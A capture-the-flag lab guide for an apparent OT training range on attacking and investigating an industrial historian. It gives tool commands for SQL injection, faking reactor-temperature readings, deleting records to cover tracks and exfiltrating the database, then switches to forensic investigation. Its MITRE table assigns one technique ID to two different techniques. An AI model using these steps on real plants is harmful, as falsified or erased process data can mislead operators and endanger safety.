# Lab 8: Historian Attacks & OT Forensics

## Overview
| Property | Value |
|----------|-------|
| Duration | 120 minutes |
| Difficulty | Expert |
| Focus | Historian, Forensics |
| Scenario | Post-Incident Investigation |
| Attacker IP | 10.0.0.100 |

## Learning Objectives
By completing this lab, you will:
1. Understand OT historian architecture and vulnerabilities
2. Execute SQL injection attacks against historian APIs
3. Manipulate and delete historical data
4. Exfiltrate sensitive process information
5. Conduct forensic investigation of OT incidents
6. Reconstruct attack timelines using multiple data sources
7. Extract and document IOCs

## Background

### OT Historians
Historians (like OSIsoft PI, Wonderware, GE Proficy) are critical infrastructure:
- Store all process data (temperatures, pressures, flows)
- Used for regulatory compliance
- Essential for incident investigation
- Often poorly secured

**Common Vulnerabilities:**
- SQL injection in web interfaces
- Unauthenticated API access
- Default credentials
- Unencrypted communications
- Excessive data retention

### Attack Impact
Compromising a historian enables:
- **Intelligence gathering**: Learn process parameters
- **Attack planning**: Identify normal operating ranges
- **Evidence destruction**: Delete logs of attack
- **Data manipulation**: Hide ongoing attacks
- **Compliance violations**: Alter regulatory data

## Part 1: Historian Reconnaissance (20 min)

### Task 1.1: Access Attacker Workstation
```bash
docker exec -it vulnot-attacker bash
```

### Task 1.2: Enumerate Historian
```bash
vulnot-historian enum -t 10.0.9.10
```

Document:
- Total number of tags
- Tag naming conventions
- Data types
- Data sources (protocols)

### Task 1.3: Identify Attack Surface
The historian API exposes several vulnerable endpoints:
- `/api/tags` - List all tags
- `/api/history` - Query historical data (SQL injectable!)
- `/api/query` - Raw SQL execution
- `/api/backup` - Database download

**🚩 FLAG: historian_enumerated**

## Part 2: SQL Injection Attacks (25 min)

### Task 2.1: Basic SQL Injection
Test the history endpoint for injection:
```bash
vulnot-historian sqli -t 10.0.9.10 --type dump_history
```

### Task 2.2: Union-Based Injection
Extract tag definitions:
```bash
vulnot-historian sqli -t 10.0.9.10 --type union_tags
```

### Task 2.3: Database Schema Enumeration
```bash
vulnot-historian sqli -t 10.0.9.10 --type table_enum
```

### Task 2.4: Raw SQL Execution
```bash
vulnot-historian raw-query -t 10.0.9.10 \
  -q "SELECT * FROM tags WHERE source LIKE '%DNP3%'"
```

**🚩 FLAG: historian_sqli_complete**

## Part 3: Data Manipulation Attacks (20 min)

### ⚠️ WARNING
Data manipulation can have serious consequences:
- Operators may make incorrect decisions
- Compliance violations
- Inability to investigate incidents
- Regulatory fines

### Attack 3.1: Inject False Data
Make reactor temperature appear normal:
```bash
vulnot-historian inject -t 10.0.9.10 \
  --tag-id 30 \
  --value 85.0 \
  --quality GOOD
```

### Attack 3.2: Backdate False Data
Inject historical data to cover tracks:
```bash
# Get timestamp from 1 hour ago
TIMESTAMP=$(date -d '1 hour ago' +%s)

vulnot-historian inject -t 10.0.9.10 \
  --tag-id 30 \
  --value 85.0 \
  --timestamp $TIMESTAMP
```

### Attack 3.3: Delete Attack Evidence
Remove records during attack window:
```bash
START=$(date -d '2 hours ago' +%s)
END=$(date -d '1 hour ago' +%s)

vulnot-historian delete -t 10.0.9.10 \
  --tag "REACTOR.TEMP" \
  --start $START \
  --end $END
```

**🚩 FLAG: historian_manipulation**

## Part 4: Data Exfiltration (15 min)

### Attack 4.1: Export Complete Database
```bash
vulnot-historian exfil -t 10.0.9.10 -o stolen_historian.db
```

### Attack 4.2: Analyze Stolen Data
```bash
sqlite3 stolen_historian.db "SELECT COUNT(*) FROM history"
sqlite3 stolen_historian.db "SELECT DISTINCT name FROM tags"
```

### What Can Attackers Learn?
- Normal operating parameters
- Process relationships
- Alarm thresholds
- Production schedules
- Equipment configurations

**🚩 FLAG: historian_exfiltrated**

## Part 5: Forensic Investigation (40 min)

Now switch roles - you are the **Blue Team** investigating an incident.

### Task 5.1: PLC Memory Acquisition
```bash
vulnot-forensics acquire-plc -t 10.0.3.10 -p s7comm -c CASE-001
```

Review collected artifacts:
- CPU information
- Program blocks
- Diagnostic buffer

### Task 5.2: Network Traffic Analysis
```bash
vulnot-forensics analyze-pcap -f /evidence/capture.pcap -c CASE-001
```

Identify:
- Attack source IPs
- Protocols used
- Suspicious commands

### Task 5.3: Historian Log Analysis
```bash
vulnot-forensics analyze-historian -H 10.0.9.10 \
  -s "2024-01-15T14:00:00" \
  -e "2024-01-15T15:00:00" \
  -c CASE-001
```

Look for:
- Sudden value changes
- Data gaps
- Quality code anomalies
- Unusual write patterns

### Task 5.4: Timeline Reconstruction
```bash
vulnot-forensics timeline -c CASE-001
```

Map events to MITRE ATT&CK for ICS.

### Task 5.5: Evidence Preservation
```bash
vulnot-forensics preserve -c CASE-001 -o CASE-001-evidence.zip
```

**🚩 FLAG: forensics_complete**

## Part 6: IOC Documentation

### Indicators of Compromise Found

| Type | Value | Context |
|------|-------|---------|
| IP Address | 10.0.0.100 | Attack source |
| User-Agent | vulnot-historian/1.0 | Attack tool |
| SQL Payload | `' OR '1'='1` | Injection attempt |
| API Endpoint | /api/query | Abused endpoint |
| Time Window | 14:00-15:00 | Attack period |

### MITRE ATT&CK Mapping

| Technique | ID | Evidence |
|-----------|-----|----------|
| Collection | T0802 | Historian queries |
| Data Destruction | T0882 | Deleted records |
| Indicator Removal | T0872 | Gap in historian |
| Theft of Operational Info | T0882 | Database exfil |

## Real-World Context

### Colonial Pipeline (2021)
- Ransomware attack
- Billing system impact led to pipeline shutdown
- Limited visibility into OT status
- Historian data critical for recovery assessment

### Oldsmar Water Treatment (2021)
- Remote access compromise
- Sodium hydroxide setpoint changed
- Historian captured the change
- Quick detection prevented harm

### Forensic Challenges in OT
- Limited logging on legacy systems
- Proprietary protocols
- Air-gapped networks
- Uptime requirements prevent imaging
- Evidence may be in PLC memory

## Assessment Questions

1. Why are historians attractive targets for attackers?
2. How can SQL injection in a historian lead to physical damage?
3. What forensic artifacts are unique to OT environments?
4. How does evidence collection differ in OT vs IT?
5. What challenges exist for incident response in OT?

## Flags Summary
| Flag | Points | Description |
|------|--------|-------------|
| historian_enumerated | 10 | Enumerated historian tags |
| historian_sqli_complete | 25 | Executed SQL injection |
| historian_manipulation | 30 | Manipulated historical data |
| historian_exfiltrated | 25 | Exfiltrated database |
| forensics_complete | 40 | Completed forensic investigation |

## Tools Used
- `vulnot-historian` - Historian attack tool
- `vulnot-forensics` - OT forensics toolkit
- `sqlite3` - Database analysis
- `tcpdump` - Network capture

## Next Steps
- Practice red team vs blue team exercise
- Study incident response playbooks
- Review MITRE ATT&CK for ICS framework
